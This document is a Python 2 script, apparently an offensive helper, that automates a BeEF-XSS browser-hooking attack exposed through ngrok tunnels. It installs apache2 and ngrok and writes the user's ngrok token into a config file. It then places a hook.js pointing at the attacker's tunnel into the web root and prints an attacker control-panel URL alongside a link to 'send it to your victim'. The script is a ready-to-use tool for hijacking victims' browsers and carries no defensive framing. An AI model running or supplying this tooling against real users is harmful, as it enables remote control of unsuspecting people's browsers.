#!/usr/bin/python
# -*- coding: utf8 -*-

import os
from time import sleep
import sys

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
def arquivo(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print 'erro'.format(**locals())
            
    
    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


   


os.system("clear")
print color ("  Hora         Data","green")
os.system(' date +"  %R      %D" ')
print color("""
    ───▐▀▄─────────▄▀▌
    ───▐▓░▀▄▀▀▀▀▀▄▀░▓▌▄▀▀▄▀▀▄
    ───▐░▓░▄▀░░░▀▄░▓░▌▀▄───▄▀
    ────█░░▌█▐░▌█▐░░█───▀▄▀
    ─▄▄▄▐▀░░░▀█▀░░░▀▌▄▄▄
    █▐▐▐▌▀▄░▀▄▀▄▀░▄▀▐▌▌▌█
    ▀▀▀▀▀▀▀▀▀▄▄▄▀▀▀▀▀▀▀▀▀
         
       Checking System

""","green")

if os.system("gnome-terminal --help > /dev/null 2>&1"):
    print color(" [ X ] gnome-terminal not found","red")
    print color(" installing...","blue")
    os.system("sudo apt-get install gnome-terminal -y > /dev/null 2>&1")
    print color(" [ ✔ ] gnome-terminal ","yellow")
else:
    print color(" [ ✔ ] gnome-terminal ","yellow")
sleep(1.0)
if os.system("ngrok -v > /dev/null 2>&1"):
    print color(" [ X ] ngrok not found","red")
    print color(" installing...","blue")
    os.system("sudo tar xvzf ~/Downloads/ngrok-stable-linux-amd64.tgz -C /usr/local/bin > /dev/null 2>&1")
    print color(" [ ✔ ] ngrok ","yellow")
else:
    print color(" [ ✔ ] ngrok ","yellow")
sleep(1.0)
if os.system("apache2 -v > /dev/null 2>&1"):
    print color(" [ X ] apache2 not found","red")
    print color(" installing...","blue")
    os.system("sudo apt-get install apache2 -y > /dev/null 2>&1")
    print color(" [ ✔ ] apache2 ","yellow")
else:
    print color(" [ ✔ ] apache2 ","yellow")
sleep(1.0)

os.system("clear")

def redsocial():
    return"""

    YouTube: https://www.youtube.com/channel/UCK9-ey3ELCm-EnHeyovvXWw
    Discord: .png#0196


    """

def h1():
    return"""
    
    You will need two LocalHost forwarded links:
    """
def h2():
    return'''
    http://exemplo.ngrok.io -> http://localhost:3000 / Attacker
    http://exemplo.ngrok.io -> http://localhost:80 / Victim
    '''
def h3():
    return'''tunnels:
  first-app:
      addr: 80
      proto: http
  second-app:
      addr: 3000
      proto: http
      
      '''
def desenho():
    return'''
    █████████
    █▄█████▄█
    █▼▼▼▼▼
    █
    Beef-XSS + Ngrok
    █▲▲▲▲▲
    █████████
    ██ ██'''

def beef():
    return'''                                      ▄
                                      ▌`W
                                      └▄ `ªw
                                        Φ,   "¥╥
   link Victim: localhost 80             `Φw "φ,`╙W,
                                           ╙▄ ╙██w`Φw
   link Attacker: localhost 3000           ,╓█Γ  ███▄╙▌
                  ▓%,           ,╓▄Φ▀▀▀█╜```    ,██████
                  ║  W       ,▄▀`     ╔   ,╓▄▄█████████
                   " ┌ ▀    ╓█`        ║▓█████████████╜
                     ▄"▌ ╙W≤▓▌      ,▄█████████████▀"
                    ╙▄██w,,█      ▄██` █████████▌
                      ╙▀████⌐   ▄██▄╓╓▓██████████
                         ║█   ▄█████████████████L
                        ,█  ,███████████████████Γ
                      j▌,,▄▄▄, "███████████████▀
                      ,████████▄ █████████████`
                      █ ▐████▌ ██████████▀╨`
                      ▀w `""` ╓██████╜`
                      `╙╝▓███████▀`
                            `"""`
'''

def ngork_h1():
    return'''
    
    For the script to work, a token is needed, which can be obtained in
    https://ngrok.com

    '''
def finalizando():
    print color ("  Hora         Data","green")
    os.system(' date +"  %R      %D" ')
    return'''
        |￣￣￣￣￣ ￣|
        |            |
        |  thanks <3  |
        |            |
        | ＿＿＿＿＿__|
        (\__/) ||
        (•ㅅ•) ||
        / 　 づ
    '''

print color ("  Hora         Data","green")
os.system(' date +"  %R      %D" ')
print color(h1(),"yellow")
print color('''         http 80/ Victim
         http 3000/ Attacker''',"red")
print color('''
    Just type your links in the script:''',"green")
print color(h2(),"red")
print(color(redsocial(),"blue"))
enter = raw_input(color("enter to continue","green"))
os.system("clear")
opcao = 0
while opcao != 3:
    print color ("  Hora         Data","green")
    os.system(' date +"  %R      %D" ')
    print color(desenho(),"blue")
    print color('''
    
    
    [1] Configure ngrok.yml
    [2] Start Beef with Ngrok
    [3] Exit script
    
    ''',"green")
    sleep(1.0)
    opcao = int(input(color("script: ","yellow")))
    if opcao == 1:
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print color(ngork_h1(),"yellow")
        token = raw_input(color("token: ","red"))
        os.system("cp tempo/ngrok.yml ngrok.yml")
        arquivo("ngrok.yml","token_1",token)
        os.system("mkdir /home/$USER/.ngrok2")
        os.system("mv ngrok.yml /home/$USER/.ngrok2")
        os.system("clear")
        print color ("  Hora         Data","green")
        os.system(' date +"  %R      %D" ')
        print("")
        print color("   Your ngrok.yml code","yellow")
        print("")
        sleep(0.50)
        print color("authtoken: "+token,"blue")
        print color(h3(),"blue")
        print("")
        print color("   ngrok.yml was saved in:","red")
        os.system("echo /home/$USER/.ngrok2/ngrok.yml")
        print("")
        print("")
        sleep(5.0)
        enter = raw_input(color("==> enter to return to menu","green"))
        os.system("clear")
    elif opcao == 2:
        os.system("clear")
        if os.system("cat /home/$USER/.ngrok2/ngrok.yml > /dev/null 2>&1"):
            print("");
            print color(" [X] ngrok.yml not found","red")
            sys.exit()
        else:
            print color ("  Hora         Data","green")
            os.system(' date +"  %R      %D" ')
            print("")
            print color("Copying files... ","red")
            print("")
            os.system("sudo service apache2 start")
            os.system("cp tempo/hook.js hook.js")
            os.system("cp tempo/index.html index.html")
            os.system('gnome-terminal -x bash -c "ngrok start --all"')
            os.system("clear")
            print color ("  Hora         Data","green")
            os.system(' date +"  %R      %D" ')
            print color (beef(),"blue")
            vitima = raw_input(color("link victim: ","red"))
            atacante = raw_input(color("link attacker: ","red"))
            atacante_full = 'http://'+atacante+':80/hook.js'
            atacante_painel = 'http://'+atacante+'/ui/panel'
            vitima_full = 'http://'+vitima+'/index.html'
            arquivo("hook.js","goth_1",atacante_full)
            arquivo("hook.js","goth_2",atacante)
            arquivo("index.html","goth_3",vitima)
            os.system("sudo mv index.html /var/www/html")
            os.system("sudo mv hook.js /var/www/html")
            print("")
            print color("attacker panel","yellow")
            print color(atacante_painel,"red")
            print("")
            print color ("send it to your victim","yellow")
            print color(vitima_full,"red")
            print("")
            sleep(5.0)
            enter = raw_input(color("==> enter to return to menu","green"))
            os.system("clear")   
    elif opcao == 3:
        os.system("clear")
    else:
        os.system("clear")

print color(finalizando(),"green")
print color(redsocial(),"red")
sleep(3.0)

